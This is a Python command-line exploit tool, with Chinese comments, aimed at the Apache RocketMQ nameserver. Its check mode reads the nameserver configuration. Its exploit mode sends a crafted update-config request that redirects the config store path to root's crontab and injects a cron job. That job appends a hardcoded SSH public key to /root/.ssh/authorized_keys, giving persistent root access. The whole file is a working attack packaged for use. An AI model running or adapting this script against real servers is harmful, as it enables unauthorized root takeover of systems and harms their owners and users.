import sys
import argparse
import socket
import binascii

class RocketMQExploit:
    def __init__(self, address, port):
        self.address = address
        self.port = port

    def check(self):
        """
        执行检查任务：获取当前的 nameserver 配置
        """
        self.get_namesrv_config()

    def exploit(self):
        """
        执行利用任务：修改 nameserver 配置，并显示修改后的配置
        """
        self.set_namesrv_config()
        self.get_namesrv_config()

    def get_namesrv_config(self):
        """
        获取 nameserver 配置
        """
        try:
            client_socket = socket.socket()
            client_socket.settimeout(5)  # 设置 socket 超时时间为 5 秒
            client_socket.connect((self.address, self.port))

            header = '{"code":318,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":405}'.encode(
                'utf-8')

            header_length = int(len(binascii.hexlify(header).decode('utf-8')) / 2)
            header_length_hex = '00000000' + str(hex(header_length))[2:]
            total_length = int(4 + header_length)
            total_length_hex = '00000000' + str(hex(total_length))[2:]
            data = total_length_hex[-8:] + header_length_hex[-8:] + binascii.hexlify(header).decode('utf-8')

            client_socket.send(bytes.fromhex(data))
            data_received = client_socket.recv(1024)
            print(data_received)

            client_socket.close()
        except socket.timeout:
            print(f"连接 {self.address}:{self.port} 超时")

    def set_namesrv_config(self):
        """
        修改 nameserver 配置
        """
        try:
            client_socket = socket.socket()
            client_socket.settimeout(5)  # 设置 socket 超时时间为 5 秒
            client_socket.connect((self.address, self.port))

            header = '{"code":318,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":405}'.encode(
                'utf-8')
            body = 'configStorePath=/var/spool/cron/root\nproductEnvName=test/path\\n\\n* * * * * echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+Jng1i80HGZhEh+5tmcbcwBYKllwY3KuaGai+shwJyPxKFD1N477al0EyPfTsUol/q/O5j8UvOT9wlT36d3lAGjWiZaoMTfqXMS7L2LkToYWhJV+KfBKcYnJR5gcOXocwudylUvP6hgczP8S9fuoiCh196BcybGg8xTBGvY2y4I0WD1ceFfX9QdNMPCVCceh8PwkbuEKuUDFBtknZaXzflGyyBNku95zT5rNSK6EPnHUSuNSaeV7RgxLcy0DWhPAmzG1vnKt9Jp4TtA0QhIMdBFw/q3BddJOT2gFMBb2RZzVFjDksJNkL0EtmgwS3KmZkMZRyMWcodpmCmc3ud83Lia1nBaAO6S8Na6rquOZc4e14Hc0OXYHPb9WREoPo+xXqGc0mm6y9ZrnmJjiJdFVhCnoGIclG68/D+nKMq39ilp5rcNgMiWKz+4CZbHc1xsDMKI0vwto3jkXh68dHEixoC0X5WTwC8NrzsdrPhmECGX4JNsyMWkfmxEAYYN4rPi0= root@ubuntu >> /root/.ssh/authorized_keys\\n\\ntest\\ntest\\ntest'.encode('utf-8')

            header_length = int(len(binascii.hexlify(header).decode('utf-8')) / 2)
            header_length_hex = '00000000' + str(hex(header_length))[2:]
            total_length = int(4 + len(binascii.hexlify(body).decode('utf-8')) / 2 + header_length)
            total_length_hex = '00000000' + str(hex(total_length))[2:]
            data = total_length_hex[-8:] + header_length_hex[-8:] + binascii.hexlify(header).decode(
                'utf-8') + binascii.hexlify(body).decode('utf-8')

            client_socket.send(bytes.fromhex(data))
            data_received = client_socket.recv(1024)
            print(data_received)

            client_socket.close()
        except socket.timeout:
            print(f"连接 {self.address}:{self.port} 超时")


def parse_arguments():
    parser = argparse.ArgumentParser(description="对 RocketMQ 进行漏洞检测和利用")
    parser.add_argument("-ip", "--address", default="127.0.0.1", help="Nameserver 地址")
    parser.add_argument("-p", "--port", default=9876, type=int, help="Nameserver 监听端口")
    parser.add_argument("-c", "--check", action="store_true", help="仅进行漏洞检查")
    parser.add_argument("-e", "--exploit", action="store_true", help="执行漏洞利用")
    return parser.parse_args()


def main():
    args = parse_arguments()
    exploit = RocketMQExploit(args.address, args.port)

    if args.check:
        exploit.check()

    if args.exploit:
        exploit.exploit()


if __name__ == "__main__":
    main()
